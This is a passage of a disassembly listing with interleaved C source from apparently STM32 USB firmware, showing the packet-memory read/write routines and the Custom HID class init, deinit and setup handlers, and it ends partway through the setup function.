 800848a:	af00      	add	r7, sp, #0
 800848c:	6078      	str	r0, [r7, #4]
 800848e:	6039      	str	r1, [r7, #0]
  UNUSED(psetup);
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 8008490:	2300      	movs	r3, #0
}
 8008492:	4618      	mov	r0, r3
 8008494:	370c      	adds	r7, #12
 8008496:	46bd      	mov	sp, r7
 8008498:	f85d 7b04 	ldr.w	r7, [sp], #4
 800849c:	4770      	bx	lr

0800849e <USB_WritePMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_WritePMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 800849e:	b480      	push	{r7}
 80084a0:	b08b      	sub	sp, #44	; 0x2c
 80084a2:	af00      	add	r7, sp, #0
 80084a4:	60f8      	str	r0, [r7, #12]
 80084a6:	60b9      	str	r1, [r7, #8]
 80084a8:	4611      	mov	r1, r2
 80084aa:	461a      	mov	r2, r3
 80084ac:	460b      	mov	r3, r1
 80084ae:	80fb      	strh	r3, [r7, #6]
 80084b0:	4613      	mov	r3, r2
 80084b2:	80bb      	strh	r3, [r7, #4]
  uint32_t n = ((uint32_t)wNBytes + 1U) >> 1;
 80084b4:	88bb      	ldrh	r3, [r7, #4]
 80084b6:	3301      	adds	r3, #1
 80084b8:	085b      	lsrs	r3, r3, #1
 80084ba:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 80084bc:	68fb      	ldr	r3, [r7, #12]
 80084be:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint16_t WrVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 80084c0:	68bb      	ldr	r3, [r7, #8]
 80084c2:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 80084c4:	88fa      	ldrh	r2, [r7, #6]
 80084c6:	697b      	ldr	r3, [r7, #20]
 80084c8:	4413      	add	r3, r2
 80084ca:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 80084ce:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 80084d0:	69bb      	ldr	r3, [r7, #24]
 80084d2:	627b      	str	r3, [r7, #36]	; 0x24
 80084d4:	e01b      	b.n	800850e <USB_WritePMA+0x70>
  {
    WrVal = pBuf[0];
 80084d6:	69fb      	ldr	r3, [r7, #28]
 80084d8:	781b      	ldrb	r3, [r3, #0]
 80084da:	827b      	strh	r3, [r7, #18]
    WrVal |= (uint16_t)pBuf[1] << 8;
 80084dc:	69fb      	ldr	r3, [r7, #28]
 80084de:	3301      	adds	r3, #1
 80084e0:	781b      	ldrb	r3, [r3, #0]
 80084e2:	021b      	lsls	r3, r3, #8
 80084e4:	b21a      	sxth	r2, r3
 80084e6:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 80084ea:	4313      	orrs	r3, r2
 80084ec:	b21b      	sxth	r3, r3
 80084ee:	827b      	strh	r3, [r7, #18]
    *pdwVal = (WrVal & 0xFFFFU);
 80084f0:	6a3b      	ldr	r3, [r7, #32]
 80084f2:	8a7a      	ldrh	r2, [r7, #18]
 80084f4:	801a      	strh	r2, [r3, #0]
    pdwVal++;
 80084f6:	6a3b      	ldr	r3, [r7, #32]
 80084f8:	3302      	adds	r3, #2
 80084fa:	623b      	str	r3, [r7, #32]

#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */

    pBuf++;
 80084fc:	69fb      	ldr	r3, [r7, #28]
 80084fe:	3301      	adds	r3, #1
 8008500:	61fb      	str	r3, [r7, #28]
    pBuf++;
 8008502:	69fb      	ldr	r3, [r7, #28]
 8008504:	3301      	adds	r3, #1
 8008506:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 8008508:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800850a:	3b01      	subs	r3, #1
 800850c:	627b      	str	r3, [r7, #36]	; 0x24
 800850e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008510:	2b00      	cmp	r3, #0
 8008512:	d1e0      	bne.n	80084d6 <USB_WritePMA+0x38>
  }
}
 8008514:	bf00      	nop
 8008516:	bf00      	nop
 8008518:	372c      	adds	r7, #44	; 0x2c
 800851a:	46bd      	mov	sp, r7
 800851c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008520:	4770      	bx	lr

08008522 <USB_ReadPMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_ReadPMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 8008522:	b480      	push	{r7}
 8008524:	b08b      	sub	sp, #44	; 0x2c
 8008526:	af00      	add	r7, sp, #0
 8008528:	60f8      	str	r0, [r7, #12]
 800852a:	60b9      	str	r1, [r7, #8]
 800852c:	4611      	mov	r1, r2
 800852e:	461a      	mov	r2, r3
 8008530:	460b      	mov	r3, r1
 8008532:	80fb      	strh	r3, [r7, #6]
 8008534:	4613      	mov	r3, r2
 8008536:	80bb      	strh	r3, [r7, #4]
  uint32_t n = (uint32_t)wNBytes >> 1;
 8008538:	88bb      	ldrh	r3, [r7, #4]
 800853a:	085b      	lsrs	r3, r3, #1
 800853c:	b29b      	uxth	r3, r3
 800853e:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 8008540:	68fb      	ldr	r3, [r7, #12]
 8008542:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint32_t RdVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 8008544:	68bb      	ldr	r3, [r7, #8]
 8008546:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 8008548:	88fa      	ldrh	r2, [r7, #6]
 800854a:	697b      	ldr	r3, [r7, #20]
 800854c:	4413      	add	r3, r2
 800854e:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8008552:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 8008554:	69bb      	ldr	r3, [r7, #24]
 8008556:	627b      	str	r3, [r7, #36]	; 0x24
 8008558:	e018      	b.n	800858c <USB_ReadPMA+0x6a>
  {
    RdVal = *(__IO uint16_t *)pdwVal;
 800855a:	6a3b      	ldr	r3, [r7, #32]
 800855c:	881b      	ldrh	r3, [r3, #0]
 800855e:	b29b      	uxth	r3, r3
 8008560:	613b      	str	r3, [r7, #16]
    pdwVal++;
 8008562:	6a3b      	ldr	r3, [r7, #32]
 8008564:	3302      	adds	r3, #2
 8008566:	623b      	str	r3, [r7, #32]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 8008568:	693b      	ldr	r3, [r7, #16]
 800856a:	b2da      	uxtb	r2, r3
 800856c:	69fb      	ldr	r3, [r7, #28]
 800856e:	701a      	strb	r2, [r3, #0]
    pBuf++;
 8008570:	69fb      	ldr	r3, [r7, #28]
 8008572:	3301      	adds	r3, #1
 8008574:	61fb      	str	r3, [r7, #28]
    *pBuf = (uint8_t)((RdVal >> 8) & 0xFFU);
 8008576:	693b      	ldr	r3, [r7, #16]
 8008578:	0a1b      	lsrs	r3, r3, #8
 800857a:	b2da      	uxtb	r2, r3
 800857c:	69fb      	ldr	r3, [r7, #28]
 800857e:	701a      	strb	r2, [r3, #0]
    pBuf++;
 8008580:	69fb      	ldr	r3, [r7, #28]
 8008582:	3301      	adds	r3, #1
 8008584:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 8008586:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008588:	3b01      	subs	r3, #1
 800858a:	627b      	str	r3, [r7, #36]	; 0x24
 800858c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800858e:	2b00      	cmp	r3, #0
 8008590:	d1e3      	bne.n	800855a <USB_ReadPMA+0x38>
#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */
  }

  if ((wNBytes % 2U) != 0U)
 8008592:	88bb      	ldrh	r3, [r7, #4]
 8008594:	f003 0301 	and.w	r3, r3, #1
 8008598:	b29b      	uxth	r3, r3
 800859a:	2b00      	cmp	r3, #0
 800859c:	d007      	beq.n	80085ae <USB_ReadPMA+0x8c>
  {
    RdVal = *pdwVal;
 800859e:	6a3b      	ldr	r3, [r7, #32]
 80085a0:	881b      	ldrh	r3, [r3, #0]
 80085a2:	b29b      	uxth	r3, r3
 80085a4:	613b      	str	r3, [r7, #16]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 80085a6:	693b      	ldr	r3, [r7, #16]
 80085a8:	b2da      	uxtb	r2, r3
 80085aa:	69fb      	ldr	r3, [r7, #28]
 80085ac:	701a      	strb	r2, [r3, #0]
  }
}
 80085ae:	bf00      	nop
 80085b0:	372c      	adds	r7, #44	; 0x2c
 80085b2:	46bd      	mov	sp, r7
 80085b4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80085b8:	4770      	bx	lr
	...

080085bc <USBD_CUSTOM_HID_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 80085bc:	b580      	push	{r7, lr}
 80085be:	b084      	sub	sp, #16
 80085c0:	af00      	add	r7, sp, #0
 80085c2:	6078      	str	r0, [r7, #4]
 80085c4:	460b      	mov	r3, r1
 80085c6:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)USBD_malloc(sizeof(USBD_CUSTOM_HID_HandleTypeDef));
 80085c8:	2024      	movs	r0, #36	; 0x24
 80085ca:	f004 fd05 	bl	800cfd8 <USBD_static_malloc>
 80085ce:	60f8      	str	r0, [r7, #12]

  if (hhid == NULL)
 80085d0:	68fb      	ldr	r3, [r7, #12]
 80085d2:	2b00      	cmp	r3, #0
 80085d4:	d109      	bne.n	80085ea <USBD_CUSTOM_HID_Init+0x2e>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 80085d6:	687b      	ldr	r3, [r7, #4]
 80085d8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80085dc:	687b      	ldr	r3, [r7, #4]
 80085de:	32b0      	adds	r2, #176	; 0xb0
 80085e0:	2100      	movs	r1, #0
 80085e2:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 80085e6:	2302      	movs	r3, #2
 80085e8:	e08b      	b.n	8008702 <USBD_CUSTOM_HID_Init+0x146>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hhid;
 80085ea:	687b      	ldr	r3, [r7, #4]
 80085ec:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80085f0:	687b      	ldr	r3, [r7, #4]
 80085f2:	32b0      	adds	r2, #176	; 0xb0
 80085f4:	68f9      	ldr	r1, [r7, #12]
 80085f6:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 80085fa:	687b      	ldr	r3, [r7, #4]
 80085fc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008600:	687b      	ldr	r3, [r7, #4]
 8008602:	32b0      	adds	r2, #176	; 0xb0
 8008604:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 8008608:	687b      	ldr	r3, [r7, #4]
 800860a:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 800860e:	687b      	ldr	r3, [r7, #4]
 8008610:	7c1b      	ldrb	r3, [r3, #16]
 8008612:	2b00      	cmp	r3, #0
 8008614:	d11b      	bne.n	800864e <USBD_CUSTOM_HID_Init+0x92>
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008616:	4b3d      	ldr	r3, [pc, #244]	; (800870c <USBD_CUSTOM_HID_Init+0x150>)
 8008618:	781b      	ldrb	r3, [r3, #0]
 800861a:	f003 020f 	and.w	r2, r3, #15
 800861e:	6879      	ldr	r1, [r7, #4]
 8008620:	4613      	mov	r3, r2
 8008622:	009b      	lsls	r3, r3, #2
 8008624:	4413      	add	r3, r2
 8008626:	009b      	lsls	r3, r3, #2
 8008628:	440b      	add	r3, r1
 800862a:	3326      	adds	r3, #38	; 0x26
 800862c:	2205      	movs	r2, #5
 800862e:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008630:	4b37      	ldr	r3, [pc, #220]	; (8008710 <USBD_CUSTOM_HID_Init+0x154>)
 8008632:	781b      	ldrb	r3, [r3, #0]
 8008634:	f003 020f 	and.w	r2, r3, #15
 8008638:	6879      	ldr	r1, [r7, #4]
 800863a:	4613      	mov	r3, r2
 800863c:	009b      	lsls	r3, r3, #2
 800863e:	4413      	add	r3, r2
 8008640:	009b      	lsls	r3, r3, #2
 8008642:	440b      	add	r3, r1
 8008644:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 8008648:	2205      	movs	r2, #5
 800864a:	801a      	strh	r2, [r3, #0]
 800864c:	e01a      	b.n	8008684 <USBD_CUSTOM_HID_Init+0xc8>
  }
  else   /* LOW and FULL-speed endpoints */
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 800864e:	4b2f      	ldr	r3, [pc, #188]	; (800870c <USBD_CUSTOM_HID_Init+0x150>)
 8008650:	781b      	ldrb	r3, [r3, #0]
 8008652:	f003 020f 	and.w	r2, r3, #15
 8008656:	6879      	ldr	r1, [r7, #4]
 8008658:	4613      	mov	r3, r2
 800865a:	009b      	lsls	r3, r3, #2
 800865c:	4413      	add	r3, r2
 800865e:	009b      	lsls	r3, r3, #2
 8008660:	440b      	add	r3, r1
 8008662:	3326      	adds	r3, #38	; 0x26
 8008664:	2205      	movs	r2, #5
 8008666:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008668:	4b29      	ldr	r3, [pc, #164]	; (8008710 <USBD_CUSTOM_HID_Init+0x154>)
 800866a:	781b      	ldrb	r3, [r3, #0]
 800866c:	f003 020f 	and.w	r2, r3, #15
 8008670:	6879      	ldr	r1, [r7, #4]
 8008672:	4613      	mov	r3, r2
 8008674:	009b      	lsls	r3, r3, #2
 8008676:	4413      	add	r3, r2
 8008678:	009b      	lsls	r3, r3, #2
 800867a:	440b      	add	r3, r1
 800867c:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 8008680:	2205      	movs	r2, #5
 8008682:	801a      	strh	r2, [r3, #0]
  }

  /* Open EP IN */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDInEpAdd, USBD_EP_TYPE_INTR,
 8008684:	4b21      	ldr	r3, [pc, #132]	; (800870c <USBD_CUSTOM_HID_Init+0x150>)
 8008686:	7819      	ldrb	r1, [r3, #0]
 8008688:	2302      	movs	r3, #2
 800868a:	2203      	movs	r2, #3
 800868c:	6878      	ldr	r0, [r7, #4]
 800868e:	f004 fa6f 	bl	800cb70 <USBD_LL_OpenEP>
                       CUSTOM_HID_EPIN_SIZE);

  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 1U;
 8008692:	4b1e      	ldr	r3, [pc, #120]	; (800870c <USBD_CUSTOM_HID_Init+0x150>)
 8008694:	781b      	ldrb	r3, [r3, #0]
 8008696:	f003 020f 	and.w	r2, r3, #15
 800869a:	6879      	ldr	r1, [r7, #4]
 800869c:	4613      	mov	r3, r2
 800869e:	009b      	lsls	r3, r3, #2
 80086a0:	4413      	add	r3, r2
 80086a2:	009b      	lsls	r3, r3, #2
 80086a4:	440b      	add	r3, r1
 80086a6:	3324      	adds	r3, #36	; 0x24
 80086a8:	2201      	movs	r2, #1
 80086aa:	801a      	strh	r2, [r3, #0]

  /* Open EP OUT */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDOutEpAdd, USBD_EP_TYPE_INTR,
 80086ac:	4b18      	ldr	r3, [pc, #96]	; (8008710 <USBD_CUSTOM_HID_Init+0x154>)
 80086ae:	7819      	ldrb	r1, [r3, #0]
 80086b0:	2302      	movs	r3, #2
 80086b2:	2203      	movs	r2, #3
 80086b4:	6878      	ldr	r0, [r7, #4]
 80086b6:	f004 fa5b 	bl	800cb70 <USBD_LL_OpenEP>
                       CUSTOM_HID_EPOUT_SIZE);

  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 1U;
 80086ba:	4b15      	ldr	r3, [pc, #84]	; (8008710 <USBD_CUSTOM_HID_Init+0x154>)
 80086bc:	781b      	ldrb	r3, [r3, #0]
 80086be:	f003 020f 	and.w	r2, r3, #15
 80086c2:	6879      	ldr	r1, [r7, #4]
 80086c4:	4613      	mov	r3, r2
 80086c6:	009b      	lsls	r3, r3, #2
 80086c8:	4413      	add	r3, r2
 80086ca:	009b      	lsls	r3, r3, #2
 80086cc:	440b      	add	r3, r1
 80086ce:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 80086d2:	2201      	movs	r2, #1
 80086d4:	801a      	strh	r2, [r3, #0]

  hhid->state = CUSTOM_HID_IDLE;
 80086d6:	68fb      	ldr	r3, [r7, #12]
 80086d8:	2200      	movs	r2, #0
 80086da:	f883 2020 	strb.w	r2, [r3, #32]

  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->Init();
 80086de:	687b      	ldr	r3, [r7, #4]
 80086e0:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80086e4:	687a      	ldr	r2, [r7, #4]
 80086e6:	33b0      	adds	r3, #176	; 0xb0
 80086e8:	009b      	lsls	r3, r3, #2
 80086ea:	4413      	add	r3, r2
 80086ec:	685b      	ldr	r3, [r3, #4]
 80086ee:	685b      	ldr	r3, [r3, #4]
 80086f0:	4798      	blx	r3

#ifndef USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED
  /* Prepare Out endpoint to receive 1st packet */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 80086f2:	4b07      	ldr	r3, [pc, #28]	; (8008710 <USBD_CUSTOM_HID_Init+0x154>)
 80086f4:	7819      	ldrb	r1, [r3, #0]
 80086f6:	68fa      	ldr	r2, [r7, #12]
 80086f8:	230f      	movs	r3, #15
 80086fa:	6878      	ldr	r0, [r7, #4]
 80086fc:	f004 fbea 	bl	800ced4 <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
#endif /* USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED */

  return (uint8_t)USBD_OK;
 8008700:	2300      	movs	r3, #0
}
 8008702:	4618      	mov	r0, r3
 8008704:	3710      	adds	r7, #16
 8008706:	46bd      	mov	sp, r7
 8008708:	bd80      	pop	{r7, pc}
 800870a:	bf00      	nop
 800870c:	200000a6 	.word	0x200000a6
 8008710:	200000a7 	.word	0x200000a7

08008714 <USBD_CUSTOM_HID_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008714:	b580      	push	{r7, lr}
 8008716:	b082      	sub	sp, #8
 8008718:	af00      	add	r7, sp, #0
 800871a:	6078      	str	r0, [r7, #4]
 800871c:	460b      	mov	r3, r1
 800871e:	70fb      	strb	r3, [r7, #3]
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close CUSTOM_HID EP IN */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDInEpAdd);
 8008720:	4b37      	ldr	r3, [pc, #220]	; (8008800 <USBD_CUSTOM_HID_DeInit+0xec>)
 8008722:	781b      	ldrb	r3, [r3, #0]
 8008724:	4619      	mov	r1, r3
 8008726:	6878      	ldr	r0, [r7, #4]
 8008728:	f004 fa60 	bl	800cbec <USBD_LL_CloseEP>
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 0U;
 800872c:	4b34      	ldr	r3, [pc, #208]	; (8008800 <USBD_CUSTOM_HID_DeInit+0xec>)
 800872e:	781b      	ldrb	r3, [r3, #0]
 8008730:	f003 020f 	and.w	r2, r3, #15
 8008734:	6879      	ldr	r1, [r7, #4]
 8008736:	4613      	mov	r3, r2
 8008738:	009b      	lsls	r3, r3, #2
 800873a:	4413      	add	r3, r2
 800873c:	009b      	lsls	r3, r3, #2
 800873e:	440b      	add	r3, r1
 8008740:	3324      	adds	r3, #36	; 0x24
 8008742:	2200      	movs	r2, #0
 8008744:	801a      	strh	r2, [r3, #0]
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = 0U;
 8008746:	4b2e      	ldr	r3, [pc, #184]	; (8008800 <USBD_CUSTOM_HID_DeInit+0xec>)
 8008748:	781b      	ldrb	r3, [r3, #0]
 800874a:	f003 020f 	and.w	r2, r3, #15
 800874e:	6879      	ldr	r1, [r7, #4]
 8008750:	4613      	mov	r3, r2
 8008752:	009b      	lsls	r3, r3, #2
 8008754:	4413      	add	r3, r2
 8008756:	009b      	lsls	r3, r3, #2
 8008758:	440b      	add	r3, r1
 800875a:	3326      	adds	r3, #38	; 0x26
 800875c:	2200      	movs	r2, #0
 800875e:	801a      	strh	r2, [r3, #0]

  /* Close CUSTOM_HID EP OUT */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDOutEpAdd);
 8008760:	4b28      	ldr	r3, [pc, #160]	; (8008804 <USBD_CUSTOM_HID_DeInit+0xf0>)
 8008762:	781b      	ldrb	r3, [r3, #0]
 8008764:	4619      	mov	r1, r3
 8008766:	6878      	ldr	r0, [r7, #4]
 8008768:	f004 fa40 	bl	800cbec <USBD_LL_CloseEP>
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 0U;
 800876c:	4b25      	ldr	r3, [pc, #148]	; (8008804 <USBD_CUSTOM_HID_DeInit+0xf0>)
 800876e:	781b      	ldrb	r3, [r3, #0]
 8008770:	f003 020f 	and.w	r2, r3, #15
 8008774:	6879      	ldr	r1, [r7, #4]
 8008776:	4613      	mov	r3, r2
 8008778:	009b      	lsls	r3, r3, #2
 800877a:	4413      	add	r3, r2
 800877c:	009b      	lsls	r3, r3, #2
 800877e:	440b      	add	r3, r1
 8008780:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008784:	2200      	movs	r2, #0
 8008786:	801a      	strh	r2, [r3, #0]
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = 0U;
 8008788:	4b1e      	ldr	r3, [pc, #120]	; (8008804 <USBD_CUSTOM_HID_DeInit+0xf0>)
 800878a:	781b      	ldrb	r3, [r3, #0]
 800878c:	f003 020f 	and.w	r2, r3, #15
 8008790:	6879      	ldr	r1, [r7, #4]
 8008792:	4613      	mov	r3, r2
 8008794:	009b      	lsls	r3, r3, #2
 8008796:	4413      	add	r3, r2
 8008798:	009b      	lsls	r3, r3, #2
 800879a:	440b      	add	r3, r1
 800879c:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 80087a0:	2200      	movs	r2, #0
 80087a2:	801a      	strh	r2, [r3, #0]

  /* Free allocated memory */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 80087a4:	687b      	ldr	r3, [r7, #4]
 80087a6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80087aa:	687b      	ldr	r3, [r7, #4]
 80087ac:	32b0      	adds	r2, #176	; 0xb0
 80087ae:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80087b2:	2b00      	cmp	r3, #0
 80087b4:	d01f      	beq.n	80087f6 <USBD_CUSTOM_HID_DeInit+0xe2>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->DeInit();
 80087b6:	687b      	ldr	r3, [r7, #4]
 80087b8:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80087bc:	687a      	ldr	r2, [r7, #4]
 80087be:	33b0      	adds	r3, #176	; 0xb0
 80087c0:	009b      	lsls	r3, r3, #2
 80087c2:	4413      	add	r3, r2
 80087c4:	685b      	ldr	r3, [r3, #4]
 80087c6:	689b      	ldr	r3, [r3, #8]
 80087c8:	4798      	blx	r3
    USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 80087ca:	687b      	ldr	r3, [r7, #4]
 80087cc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80087d0:	687b      	ldr	r3, [r7, #4]
 80087d2:	32b0      	adds	r2, #176	; 0xb0
 80087d4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80087d8:	4618      	mov	r0, r3
 80087da:	f004 fc19 	bl	800d010 <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 80087de:	687b      	ldr	r3, [r7, #4]
 80087e0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80087e4:	687b      	ldr	r3, [r7, #4]
 80087e6:	32b0      	adds	r2, #176	; 0xb0
 80087e8:	2100      	movs	r1, #0
 80087ea:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 80087ee:	687b      	ldr	r3, [r7, #4]
 80087f0:	2200      	movs	r2, #0
 80087f2:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 80087f6:	2300      	movs	r3, #0
}
 80087f8:	4618      	mov	r0, r3
 80087fa:	3708      	adds	r7, #8
 80087fc:	46bd      	mov	sp, r7
 80087fe:	bd80      	pop	{r7, pc}
 8008800:	200000a6 	.word	0x200000a6
 8008804:	200000a7 	.word	0x200000a7

08008808 <USBD_CUSTOM_HID_Setup>:
  * @param  req: usb requests
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Setup(USBD_HandleTypeDef *pdev,
                                     USBD_SetupReqTypedef *req)
{
 8008808:	b580      	push	{r7, lr}
 800880a:	b088      	sub	sp, #32
 800880c:	af00      	add	r7, sp, #0
 800880e:	6078      	str	r0, [r7, #4]
 8008810:	6039      	str	r1, [r7, #0]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008812:	687b      	ldr	r3, [r7, #4]
 8008814:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008818:	687b      	ldr	r3, [r7, #4]
 800881a:	32b0      	adds	r2, #176	; 0xb0
 800881c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008820:	613b      	str	r3, [r7, #16]
  uint16_t len = 0U;
 8008822:	2300      	movs	r3, #0
 8008824:	83fb      	strh	r3, [r7, #30]
#ifdef USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED
  uint16_t ReportLength = 0U;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */
  uint8_t  *pbuf = NULL;
 8008826:	2300      	movs	r3, #0
 8008828:	61bb      	str	r3, [r7, #24]
  uint16_t status_info = 0U;
 800882a:	2300      	movs	r3, #0
 800882c:	81fb      	strh	r3, [r7, #14]
  USBD_StatusTypeDef ret = USBD_OK;
 800882e:	2300      	movs	r3, #0
 8008830:	75fb      	strb	r3, [r7, #23]

  if (hhid == NULL)
 8008832:	693b      	ldr	r3, [r7, #16]
 8008834:	2b00      	cmp	r3, #0
 8008836:	d101      	bne.n	800883c <USBD_CUSTOM_HID_Setup+0x34>
  {
    return (uint8_t)USBD_FAIL;
 8008838:	2303      	movs	r3, #3
 800883a:	e0f8      	b.n	8008a2e <USBD_CUSTOM_HID_Setup+0x226>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800883c:	683b      	ldr	r3, [r7, #0]
 800883e:	781b      	ldrb	r3, [r3, #0]
 8008840:	f003 0360 	and.w	r3, r3, #96	; 0x60
 8008844:	2b00      	cmp	r3, #0
 8008846:	d056      	beq.n	80088f6 <USBD_CUSTOM_HID_Setup+0xee>
 8008848:	2b20      	cmp	r3, #32
 800884a:	f040 80e8 	bne.w	8008a1e <USBD_CUSTOM_HID_Setup+0x216>
  {
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 800884e:	683b      	ldr	r3, [r7, #0]
 8008850:	785b      	ldrb	r3, [r3, #1]
